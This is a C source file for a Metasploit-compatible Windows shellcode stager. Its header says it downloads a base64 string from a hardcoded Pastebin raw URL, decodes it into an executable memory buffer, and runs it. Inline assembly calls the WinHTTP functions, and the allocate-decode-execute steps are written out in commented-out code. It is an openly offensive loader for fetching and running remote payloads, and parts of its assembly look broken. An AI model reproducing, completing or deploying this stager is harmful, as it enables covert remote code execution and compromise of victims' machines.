/*
 * A C-based stager client compat with the Metasploit Framework.
 *
 * Reads a b64 encoded string from pastebin, treats it as shellcode, and
 *    executes it.
 *
 * @author Dakota Nelson (dakota.w.nelson@gmail.com)
 *  based on a stager by Raphael Mudge (raffi@strategiccyber.com)
 *  Original code available at https://github.com/rsmudge/metasploit-loader
 * @license BSD License.
 *
 * Relevant messages:
 * * http://mail.metasploit.com/pipermail/framework/2012-September/008660.html
 * * http://mail.metasploit.com/pipermail/framework/2012-September/008664.html
 */

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>

//#include "block_api.s"

//extern void api_call();

/* a quick routine to quit and report why we quit */
/* void punt(char * error) { */
/*   printf("Bad things: %s\n", error); */
/*   printf("Official error: %lu\n", GetLastError()); */
/*   exit(1); */
/* } */

int main(int argc, char * argv[]) {
  BYTE * buffer;
  void (*function)();
  DWORD size;
  HINTERNET hSession = NULL,
            hRequest = NULL,
            hConnect = NULL;

  void *funcs[] = {&WinHttpOpen, &WinHttpConnect, &WinHttpOpenRequest, &WinHttpSendRequest, &WinHttpReceiveResponse};

  LPSTR pszOutBuffer;
  DWORD dwSize = 0;
  DWORD dwDownloaded = 0;

  LPCWSTR userAgent = L"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko";
  LPCWSTR host = L"www.pastebin.com";
  LPCWSTR path = L"/raw.php?i=PDg27FPb";
  BOOL result;
  void *url[] = {&host, &path};
  /* see:
   * msdn.microsoft.com/en-us/library/windows/desktop/aa384098(v=vs.85).aspx 
   * */

  asm(
    "xor %%ebx, %%ebx\n\t"
    "push %%ebx\n\t"
    "push %%ebx\n\t"
    "push %%ebx\n\t"
    "push %%ebx\n\t"
    "push %%ebx\n\t"
    "push %[userAgent]\n\t"
    "call *%[funcs]\n\t"
    "movl %%eax, %%ecx\n\t"
    "push %%ebx\n\t"
    "push %%ebx\n\t"
    "push %[url]\n\t"
    "push %%ecx\n\t"
    "call *32%[funcs]\n\t"
    "movl %%eax, %%eax\n\t"
    "push %%ebx\n\t"
    "push %%ebx\n\t"
    "push %%ebx\n\t"
    "push %%ebx\n\t"
    "push 32%[url]\n\t"
    "push %%ebx\n\t"
    "push %%ecx\n\t"
    "call *64%[funcs]\n\t"
    "movl %%eax, %%eax\n\t"
    "push %%ebx\n\t"
    "push %%ebx\n\t"
    "push %%ebx\n\t"
    "push %%ebx\n\t"
    "push %%ebx\n\t"
    "push %%ebx\n\t"
    "push %%ecx\n\t"
    "call *96%[funcs]\n\t"
    "push %%ebx\n\t"
    "push %%ecx\n\t"
    "call *128%[funcs]\n\t"
    "movl %%ecx, %[hRequest]\n\t"
    "movl %%eax, %[result]"
    : [result] "=r" (result),
      [hRequest] "=r" (hRequest)
    : [userAgent] "r" (userAgent),
      [funcs] "o" (funcs),
      [url] "o" (url)
    : "eax", "ebx", "ecx"
  );

  printf("%s", result ? "true" : "false");
  /* BOOL win = WinHttpQueryDataAvailable(hRequest, &dwSize); */

  /* /1* asm("push %[dwSize]\n\t" *1/ */
  /* /1* "push %[hRequest]\n\t" *1/ */
  /* /1* "call *%[function]\n\t" *1/ */
  /* /1* : *1/ */
  /* /1* : [hRequest] "r" (hRequest), *1/ */
  /* /1*   [dwSize] "r" (&dwSize), *1/ */
  /* /1*   [function] "r" (WinHttpQueryDataAvailable) *1/ */
  /* /1* : "eax" *1/ */
  /* /1* );*/

  /* pszOutBuffer = malloc(dwSize+1); */

  /* ZeroMemory(pszOutBuffer, dwSize+1); */

  /* WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, */
  /*                 dwSize, &dwDownloaded); */
  /* // request handle, buffer to write to, number of bytes to read, */
  /* // number of bytes actually read */

  /* if (hRequest) WinHttpCloseHandle(hRequest); */
  /* if (hConnect) WinHttpCloseHandle(hConnect); */
  /* if (hSession) WinHttpCloseHandle(hSession); */

  /* CryptStringToBinary(pszOutBuffer, dwSize, CRYPT_STRING_BASE64, */
  /*                                NULL, &size, NULL, NULL); */

  /* /1* allocate a RWX buffer *1/ */
  /* buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE); */

  /* /1* read <size> characters, b64 decode, then treat as code, and */
  /*  * toss our newly found shellcode into the buffer *1/ */

  /* CryptStringToBinary(pszOutBuffer, 0, CRYPT_STRING_BASE64, */
  /*                                buffer, &size, NULL, NULL); */

  /* free(pszOutBuffer); */

  /* /1* cast our buffer as a function and call it *1/ */
  /* function = (void (*)())buffer; */
  /* function(); */

  return 0;
}

